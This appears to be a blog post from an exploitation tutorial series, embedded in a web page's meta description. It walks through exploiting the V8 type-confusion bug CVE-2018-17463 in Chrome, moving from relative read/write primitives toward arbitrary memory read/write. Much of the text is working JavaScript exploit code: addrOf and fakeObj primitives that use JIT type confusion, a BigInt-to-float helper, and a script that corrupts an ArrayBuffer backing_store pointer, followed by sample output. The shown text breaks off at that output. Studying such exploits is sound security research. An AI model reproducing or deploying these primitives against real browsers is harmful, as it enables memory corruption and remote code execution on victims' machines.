

<!DOCTYPE html>
<html lang="ko-KR" data-default-color-scheme="&#34;auto&#34;">



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.ico">
  <link rel="icon" type="image/png" href="/img/favicon.ico">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="description" content="&lt;p&gt;Hello, OUYA77 here!&lt;/p&gt;
&lt;p&gt;Last time I failed to manage the post length and stopped after obtaining only the Read/Write primitives; this time I&amp;#x2019;ll go all the way to RCE. So in this post I&amp;#x2019;ll cover the remaining exploit details from CVE-2018-17463 and talk about the Heap Sandbox.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;See previous posts&lt;br&gt;&amp;#x2192; &lt;a href=&#34;https://hackyboiz.github.io/2025/07/01/OUYA77/Chrome_part1/en/&#34;&gt;Starting Chrome Exploitation with Type Confusion 101 ^-^&amp;#x2606; Part 1.&lt;/a&gt;&lt;br&gt;&amp;#x2192; &lt;a href=&#34;https://hackyboiz.github.io/2025/07/30/OUYA77/Chrome_part2/en/&#34;&gt;Starting Chrome Exploitation with Type Confusion 101 ^-^&amp;#x2606; Part 2.&lt;/a&gt;&lt;br&gt;&amp;#x2192; &lt;a href=&#34;https://hackyboiz.github.io/2025/09/26/OUYA77/Chrome_part3/en/&#34;&gt;Starting Chrome Exploitation with Type Confusion 101 ^-^&amp;#x2606; Part 3.&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;0-Recap&#34;&gt;&lt;a href=&#34;#0-Recap&#34; class=&#34;headerlink&#34; title=&#34;0. Recap&#34;&gt;&lt;/a&gt;0. Recap&lt;/h2&gt;&lt;p&gt;In Part 3 we used type confusion to find overlapping property pairs. Because an object pointer was interpreted as a double, by reading/writing the double field we were able to obtain Read/Write primitives from the pointer value being corrupted.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;The addrOf Read Primitive&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&#34;hljs jsx&#34;&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;addrOf&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;&lt;/span&gt;) &lt;/span&gt;{
    &lt;span class=&#34;hljs-comment&#34;&gt;// 1. Dynamically create the vuln function (bypass Map checks)&lt;/span&gt;
    &lt;span class=&#34;hljs-built_in&#34;&gt;eval&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;`&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;    function vuln(obj) {&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;      obj.inline;&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;      this.Object.create(obj);&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;      // We expect p1 to be a Double, but the actual loaded value is&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;      // an Object pointer (p2)&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;      return obj.p&lt;span class=&#34;hljs-subst&#34;&gt;${p1}&lt;/span&gt;.x; &lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;    }&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;  `&lt;/span&gt;);

    &lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; obj = {&lt;span class=&#34;hljs-attr&#34;&gt;z&lt;/span&gt;: &lt;span class=&#34;hljs-number&#34;&gt;1234&lt;/span&gt;}; &lt;span class=&#34;hljs-comment&#34;&gt;// target object whose address we want to know&lt;/span&gt;
    &lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; pValues = [];
    pValues[p1] = {&lt;span class=&#34;hljs-attr&#34;&gt;x&lt;/span&gt;: &lt;span class=&#34;hljs-number&#34;&gt;13.37&lt;/span&gt;}; &lt;span class=&#34;hljs-comment&#34;&gt;// Double (expected type)&lt;/span&gt;
    pValues[p2] = {&lt;span class=&#34;hljs-attr&#34;&gt;y&lt;/span&gt;: obj}; &lt;span class=&#34;hljs-comment&#34;&gt;// Object (actual loaded value)&lt;/span&gt;

    &lt;span class=&#34;hljs-comment&#34;&gt;// 2. Trigger JIT optimization and induce Type Confusion&lt;/span&gt;
    &lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt; (&lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; i = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;; i &amp;lt; &lt;span class=&#34;hljs-number&#34;&gt;10000&lt;/span&gt;; i++) {
        &lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; res = vuln(makeObj(pValues));
        &lt;span class=&#34;hljs-comment&#34;&gt;// If the return value is not 13.37 (i.e., an address leaked), success&lt;/span&gt;
        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (res != &lt;span class=&#34;hljs-number&#34;&gt;13.37&lt;/span&gt;) {
            &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; res.toBigInt() - &lt;span class=&#34;hljs-number&#34;&gt;1n&lt;/span&gt;; &lt;span class=&#34;hljs-comment&#34;&gt;// return address with tag removed&lt;/span&gt;
        }
    }
    &lt;span class=&#34;hljs-keyword&#34;&gt;throw&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[!] AddrOf Primitive Failed&amp;quot;&lt;/span&gt;
}&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;The fakeObj Write Primitive&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&#34;hljs jsx&#34;&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;fakeObj&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;&lt;/span&gt;) &lt;/span&gt;{
    &lt;span class=&#34;hljs-built_in&#34;&gt;eval&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;`&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;    function vuln(obj) {&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;      obj.inline;&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;      this.Object.create(obj);&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;      let orig = obj.p&lt;span class=&#34;hljs-subst&#34;&gt;${p1}&lt;/span&gt;.x;&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;      // Overwrite property x of p1, but due to type confusion&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;      // we overwrite property y of p2&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;      obj.p&lt;span class=&#34;hljs-subst&#34;&gt;${p1}&lt;/span&gt;.x = 0x41414141n;&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;      return orig;&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;    }&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;  `&lt;/span&gt;);

    &lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; obj = {&lt;span class=&#34;hljs-attr&#34;&gt;z&lt;/span&gt;: &lt;span class=&#34;hljs-number&#34;&gt;1234&lt;/span&gt;};
    &lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; pValues = [];
    pValues[p1] = {&lt;span class=&#34;hljs-attr&#34;&gt;x&lt;/span&gt;: &lt;span class=&#34;hljs-number&#34;&gt;13.37&lt;/span&gt;};
    pValues[p2] = {&lt;span class=&#34;hljs-attr&#34;&gt;y&lt;/span&gt;: obj};

    &lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt; (&lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; i = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;; i &amp;lt; &lt;span class=&#34;hljs-number&#34;&gt;10000&lt;/span&gt;; i++) {
        &lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; res = vuln(makeObj(pValues));
        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (res != &lt;span class=&#34;hljs-number&#34;&gt;13.37&lt;/span&gt;) {
            &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; res;
        }
    }
}&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Now that we have a read primitive that can leak addresses and a write primitive that can write to object addresses, we&amp;#x2019;ll refine these into arbitrary memory read/write (AAR/AAW) primitives for the exploit and drive toward RCE.&lt;/p&gt;
&lt;h1 id=&#34;1-CVE-2018-17463-cont&amp;#x2019;d-For-RCE&#34;&gt;&lt;a href=&#34;#1-CVE-2018-17463-cont&amp;#x2019;d-For-RCE&#34; class=&#34;headerlink&#34; title=&#34;1. CVE-2018-17463 (cont&amp;#x2019;d) - For RCE&#34;&gt;&lt;/a&gt;1. CVE-2018-17463 (cont&amp;#x2019;d) - For RCE&lt;/h1&gt;&lt;h2 id=&#34;1-1-Relative-R-W-&amp;#x2192;-AAR-W&#34;&gt;&lt;a href=&#34;#1-1-Relative-R-W-&amp;#x2192;-AAR-W&#34; class=&#34;headerlink&#34; title=&#34;1.1 Relative R/W &amp;#x2192; AAR/W&#34;&gt;&lt;/a&gt;1.1 Relative R/W &amp;#x2192; AAR/W&lt;/h2&gt;&lt;h3 id=&#34;Concept&#34;&gt;&lt;a href=&#34;#Concept&#34; class=&#34;headerlink&#34; title=&#34;Concept)&#34;&gt;&lt;/a&gt;Concept)&lt;/h3&gt;&lt;p&gt;The current read/write primitives let us overwrite property values(pointers) inside other JavaScript objects, but that alone isn&amp;#x2019;t useful for reading/writing arbitrary memory addresses directly.&lt;/p&gt;
&lt;p&gt;The problem stems from &lt;strong&gt;how V8 manages objects&lt;/strong&gt;. Even if we overwrite a memory slot with a value that looks like an address (e.g., &lt;code&gt;0x41414141&lt;/code&gt;), V8 will still treat that value as a &lt;strong&gt;valid JavaScript object pointer&lt;/strong&gt;. So if we write the address where we want to put shellcode into an object pointer slot, V8 will dereference that pointer expecting a real object layout and then try to access its internal fields (for example, the &lt;code&gt;backing store&lt;/code&gt; pointer at offset 8). Because the memory at that address likely does not contain the expected object layout, V8 will crash or the manipulation will fail.&lt;/p&gt;
&lt;p&gt;To get true arbitrary-address read/write(AAR/AAW) we must overwrite an &lt;strong&gt;internal field that V8 actually uses as a raw memory pointer&lt;/strong&gt;, not a JavaScript object pointer. A commonly used target is the &lt;code&gt;backing_store&lt;/code&gt; pointer of an &lt;code&gt;ArrayBuffer&lt;/code&gt;. An &lt;code&gt;ArrayBuffer&lt;/code&gt; represents a fixed-length block of binary data; one of its internal fields is a pointer to the actual memory that stores the bytes &amp;#x2014; the &lt;code&gt;backing_store&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Because typed arrays (&lt;code&gt;TypedArray&lt;/code&gt;, &lt;code&gt;DataView&lt;/code&gt;, etc.) read and write through that &lt;code&gt;backing_store&lt;/code&gt; pointer, controlling it effectively gives us control of what memory a typed-view reads/writes. Crucially, V8 treats the &lt;code&gt;backing_store&lt;/code&gt; as a raw buffer address rather than validating it as a JavaScript object pointer, so overwriting it lets us point an &lt;code&gt;ArrayBuffer&lt;/code&gt; at arbitrary memory.&lt;/p&gt;
&lt;p&gt;Note: you cannot directly read/write data from an &lt;code&gt;ArrayBuffer&lt;/code&gt; without a view &amp;#x2014; you must access it via a &lt;code&gt;TypedArray&lt;/code&gt; or &lt;code&gt;DataView&lt;/code&gt; using the desired format (float, 64-bit integer, etc.). The exploitation flow becomes: use the limited Relative R/W primitive to overwrite an &lt;code&gt;ArrayBuffer&lt;/code&gt;&amp;#x2018;s &lt;code&gt;backing_store&lt;/code&gt; pointer, then use a &lt;code&gt;TypedArray/DataView&lt;/code&gt; on that buffer to read/write arbitrary memory.&lt;/p&gt;
&lt;h3 id=&#34;Exploitation&#34;&gt;&lt;a href=&#34;#Exploitation&#34; class=&#34;headerlink&#34; title=&#34;Exploitation)&#34;&gt;&lt;/a&gt;Exploitation)&lt;/h3&gt;&lt;p&gt;Let&amp;#x2019;s see how to implement that concept with the &lt;code&gt;fakeObj&lt;/code&gt; primitive we already used.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs jsx&#34;&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;fakeObj&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;&lt;/span&gt;) &lt;/span&gt;{
    &lt;span class=&#34;hljs-built_in&#34;&gt;eval&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;`&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;    function vuln(obj) {&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;      obj.inline;&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;      this.Object.create(obj);&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;      let orig = obj.p&lt;span class=&#34;hljs-subst&#34;&gt;${p1}&lt;/span&gt;.x;&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;      // Overwrite property x of p1, but due to type confusion&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;      // we overwrite property y of p2&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;      obj.p&lt;span class=&#34;hljs-subst&#34;&gt;${p1}&lt;/span&gt;.x = 0x41414141n;&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;      return orig;&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;    }&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;  `&lt;/span&gt;);

    &lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; obj = {&lt;span class=&#34;hljs-attr&#34;&gt;z&lt;/span&gt;: &lt;span class=&#34;hljs-number&#34;&gt;1234&lt;/span&gt;};
    &lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; pValues = [];
    pValues[p1] = {&lt;span class=&#34;hljs-attr&#34;&gt;x&lt;/span&gt;: &lt;span class=&#34;hljs-number&#34;&gt;13.37&lt;/span&gt;};
    pValues[p2] = {&lt;span class=&#34;hljs-attr&#34;&gt;y&lt;/span&gt;: obj}
    ...&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;With &lt;code&gt;fakeObj&lt;/code&gt; we can overwrite certain inline properties that overlap with other objects&amp;#x2019; inline fields. In the &lt;code&gt;vuln&lt;/code&gt; function we attempt to write &lt;code&gt;p1.x&lt;/code&gt;, but due to type confusion that write actually targets &lt;code&gt;p2&lt;/code&gt;&amp;#x2018;s inline slot. That allows us to overwrite an object&amp;#x2019;s stored pointer value.&lt;/p&gt;
&lt;p&gt;The diagrams below illustrate the overlap. The &lt;code&gt;ArrayBuffer&lt;/code&gt; backing_store pointer sits at offset 32, so if we create an object with two inline properties (e.g., &lt;code&gt;x1&lt;/code&gt; and &lt;code&gt;x2&lt;/code&gt;) where &lt;code&gt;x2&lt;/code&gt; overlaps that backing_store slot, we can use the &lt;code&gt;fakeObj&lt;/code&gt; write to target the backing_store pointer.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image.png&#34; alt=&#34;ref: [https://jhalon.github.io/chrome-browser-exploitation-3/](https://jhalon.github.io/chrome-browser-exploitation-3/)&#34;&gt;&lt;/p&gt;
&lt;p&gt;ref: &lt;a href=&#34;https://jhalon.github.io/chrome-browser-exploitation-3/&#34;&gt;https://jhalon.github.io/chrome-browser-exploitation-3/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;ArrayBuffer backing_store is at offset 32; by adding another inline property &lt;code&gt;x2&lt;/code&gt; we can reach and overwrite that pointer via our primitive.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image%201.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;Using one overwritten ArrayBuffer is useful, but repeatedly triggering the bug to change the backing_store each time you want to read/write many addresses is tedious. A more practical trick uses &lt;strong&gt;two ArrayBuffers&lt;/strong&gt;:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Corrupt the backing_store pointer of the first ArrayBuffer so it points to the second ArrayBuffer object.&lt;/li&gt;
&lt;li&gt;Use a &lt;code&gt;TypedArray&lt;/code&gt; view on the first buffer to write into a specific property index which, because we pointed it at the second buffer, will overwrite the second buffer&amp;#x2019;s backing_store pointer.&lt;/li&gt;
&lt;li&gt;Now the second buffer&amp;#x2019;s backing_store points at an attacker-controlled address. Using a &lt;code&gt;TypedArray&lt;/code&gt; view on the second buffer lets you read/write that memory directly.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;This two-buffer technique lets you rapidly read/write arbitrary heap addresses without retriggering the vulnerability for every access. Diagram showing the two-buffer trick:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image%202.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;Coding&#34;&gt;&lt;a href=&#34;#Coding&#34; class=&#34;headerlink&#34; title=&#34;Coding)&#34;&gt;&lt;/a&gt;Coding)&lt;/h3&gt;&lt;p&gt;We previously hard-coded the overwritten value. Now we make the primitive accept a parameter for the new value, and we change &lt;code&gt;p1&lt;/code&gt; to have &lt;strong&gt;two inline properties&lt;/strong&gt;, because the second inline property overlaps with the ArrayBuffer &lt;code&gt;backing_store&lt;/code&gt;. So the &lt;code&gt;vuln&lt;/code&gt; function must write to the second inline property to overwrite the backing_store pointer.&lt;/p&gt;
&lt;p&gt;Also add a &lt;code&gt;toNumber&lt;/code&gt; helper to convert &lt;code&gt;BigInt&lt;/code&gt; addresses into the floating representation used in the type-confused slot (because our type confusion returns a float, we need to convert addresses into float bit patterns).&lt;/p&gt;
&lt;p&gt;Final &lt;code&gt;fakeObj&lt;/code&gt; primitive:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs jsx&#34;&gt;BigInt.prototype.toNumber = &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;toNumber&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;&lt;/span&gt;) &lt;/span&gt;{
    uint64View[&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;] = &lt;span class=&#34;hljs-built_in&#34;&gt;this&lt;/span&gt;;
    &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; floatView[&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;];
};

&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;fakeObj&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;obj, newValue&lt;/span&gt;) &lt;/span&gt;{
    &lt;span class=&#34;hljs-built_in&#34;&gt;eval&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;`&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;    function vuln(obj) {&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;      obj.inline;&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;      this.Object.create(obj);&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;      // Write to Backing Store Pointer via Property x2&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;      let orig = obj.p&lt;span class=&#34;hljs-subst&#34;&gt;${p1}&lt;/span&gt;.x2;&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;      obj.p&lt;span class=&#34;hljs-subst&#34;&gt;${p1}&lt;/span&gt;.x2 = &lt;span class=&#34;hljs-subst&#34;&gt;${newValue.toNumber()}&lt;/span&gt;;&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;      return orig;&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;    }&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;  `&lt;/span&gt;);

    &lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; pValues = [];
    &lt;span class=&#34;hljs-comment&#34;&gt;// x2 Property Overlaps Backing Store Pointer for Array Buffer&lt;/span&gt;
    &lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; o = {&lt;span class=&#34;hljs-attr&#34;&gt;x1&lt;/span&gt;: &lt;span class=&#34;hljs-number&#34;&gt;13.37&lt;/span&gt;, &lt;span class=&#34;hljs-attr&#34;&gt;x2&lt;/span&gt;: &lt;span class=&#34;hljs-number&#34;&gt;13.38&lt;/span&gt;};
    pValues[p1] = o;
    pValues[p2] = obj;

    &lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt; (&lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; i = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;; i &amp;lt; &lt;span class=&#34;hljs-number&#34;&gt;10000&lt;/span&gt;; i++) {
        &lt;span class=&#34;hljs-comment&#34;&gt;// Force Map Check and Redundancy Elimination&lt;/span&gt;
        o.x2 = &lt;span class=&#34;hljs-number&#34;&gt;13.38&lt;/span&gt;;
        &lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; res = vuln(makeObj(pValues));
        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (res != &lt;span class=&#34;hljs-number&#34;&gt;13.38&lt;/span&gt;) {
            &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; res.toBigInt();
        }
    }
    &lt;span class=&#34;hljs-keyword&#34;&gt;throw&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[!] fakeObj Primitive Failed&amp;quot;&lt;/span&gt;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;We must also update the &lt;code&gt;addrOf&lt;/code&gt; primitive in the same way (use &lt;code&gt;x2&lt;/code&gt;):&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs jsx&#34;&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;addrOf&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;obj&lt;/span&gt;) &lt;/span&gt;{
    &lt;span class=&#34;hljs-built_in&#34;&gt;eval&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;`&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;    function vuln(obj) {&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;      obj.inline;&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;      this.Object.create(obj);&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;      // Trigger our type-confusion by accessing an out-of-bound property&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;      // This will load p1 from our object thinking it&amp;apos;s a Double, but instead&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;      // due to overlap, it will load p2 which is an Object&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;      return obj.p&lt;span class=&#34;hljs-subst&#34;&gt;${p1}&lt;/span&gt;.x2;&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;    }&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;  `&lt;/span&gt;);

    &lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; pValues = [];
    &lt;span class=&#34;hljs-comment&#34;&gt;// x2 Property Overlaps Backing Store Pointer for Array Buffer&lt;/span&gt;
    pValues[p1] = {&lt;span class=&#34;hljs-attr&#34;&gt;x1&lt;/span&gt;: &lt;span class=&#34;hljs-number&#34;&gt;13.37&lt;/span&gt;, &lt;span class=&#34;hljs-attr&#34;&gt;x2&lt;/span&gt;: &lt;span class=&#34;hljs-number&#34;&gt;13.38&lt;/span&gt;};
    pValues[p2] = {&lt;span class=&#34;hljs-attr&#34;&gt;y&lt;/span&gt;: obj};

    &lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt; (&lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; i = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;; i &amp;lt; &lt;span class=&#34;hljs-number&#34;&gt;10000&lt;/span&gt;; i++) {
        &lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; res = vuln(makeObj(pValues));
        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (res != &lt;span class=&#34;hljs-number&#34;&gt;13.37&lt;/span&gt;) {
            &lt;span class=&#34;hljs-comment&#34;&gt;// Subtract 1n from address due to pointer tagging.&lt;/span&gt;
            &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; res.toBigInt() - &lt;span class=&#34;hljs-number&#34;&gt;1n&lt;/span&gt;;
        }
    }
    &lt;span class=&#34;hljs-keyword&#34;&gt;throw&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[!] AddrOf Primitive Failed&amp;quot;&lt;/span&gt;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;hr&gt;
&lt;p&gt;Now that the exploit script is modified, we should be able to overwrite an ArrayBuffer&amp;#x2019;s backing_store pointer. Let&amp;#x2019;s test it: create a new 1024-byte ArrayBuffer, leak its address, then overwrite its backing_store with &lt;code&gt;0x41414141&lt;/code&gt; and verify using &lt;code&gt;%DebugPrint&lt;/code&gt; that the backing_store changed.&lt;/p&gt;
&lt;p&gt;Append to the script:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs jsx&#34;&gt;print(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[+] Finding Overlapping Properties...&amp;quot;&lt;/span&gt;);
findOverlappingProperties();
print(&lt;span class=&#34;hljs-string&#34;&gt;`[+] Properties p&lt;span class=&#34;hljs-subst&#34;&gt;${p1}&lt;/span&gt; and p&lt;span class=&#34;hljs-subst&#34;&gt;${p2}&lt;/span&gt; overlap!`&lt;/span&gt;);

&lt;span class=&#34;hljs-comment&#34;&gt;// Create Array Buffer&lt;/span&gt;
&lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; arrBuf1 = &lt;span class=&#34;hljs-keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;hljs-built_in&#34;&gt;ArrayBuffer&lt;/span&gt;(&lt;span class=&#34;hljs-number&#34;&gt;1024&lt;/span&gt;);

print(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[+] Leaking ArrayBuffer Address...&amp;quot;&lt;/span&gt;);
&lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; arrBuf1fAddr = addrOf(arrBuf1);
print(&lt;span class=&#34;hljs-string&#34;&gt;`[+] ArrayBuffer Address: 0x&lt;span class=&#34;hljs-subst&#34;&gt;${arrBuf1fAddr.toString(&lt;span class=&#34;hljs-number&#34;&gt;16&lt;/span&gt;)}&lt;/span&gt;`&lt;/span&gt;);
%DebugPrint(arrBuf1)

print(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[+] Corrupting ArrayBuffer Backing Store Address...&amp;quot;&lt;/span&gt;)
&lt;span class=&#34;hljs-comment&#34;&gt;// Overwrite Backing Store Pointer with 0x41414141&lt;/span&gt;
&lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; ret = fakeObj(arrBuf1, &lt;span class=&#34;hljs-number&#34;&gt;0x41414141n&lt;/span&gt;);
print(&lt;span class=&#34;hljs-string&#34;&gt;`[+] Original Leaked Data: 0x&lt;span class=&#34;hljs-subst&#34;&gt;${ret.toString(&lt;span class=&#34;hljs-number&#34;&gt;16&lt;/span&gt;)}&lt;/span&gt;`&lt;/span&gt;);
%DebugPrint(arrBuf1)&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Example output:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs prolog&#34;&gt;[+] &lt;span class=&#34;hljs-symbol&#34;&gt;Finding&lt;/span&gt; &lt;span class=&#34;hljs-symbol&#34;&gt;Overlapping&lt;/span&gt; &lt;span class=&#34;hljs-symbol&#34;&gt;Properties&lt;/span&gt;...
[+] &lt;span class=&#34;hljs-symbol&#34;&gt;Properties&lt;/span&gt; p15 and p11 overlap!
[+] &lt;span class=&#34;hljs-symbol&#34;&gt;Leaking&lt;/span&gt; &lt;span class=&#34;hljs-symbol&#34;&gt;ArrayBuffer&lt;/span&gt; &lt;span class=&#34;hljs-symbol&#34;&gt;Address&lt;/span&gt;...
[+] &lt;span class=&#34;hljs-symbol&#34;&gt;ArrayBuffer&lt;/span&gt; &lt;span class=&#34;hljs-symbol&#34;&gt;Address&lt;/span&gt;: &lt;span class=&#34;hljs-number&#34;&gt;0x2a164919360&lt;/span&gt;
...
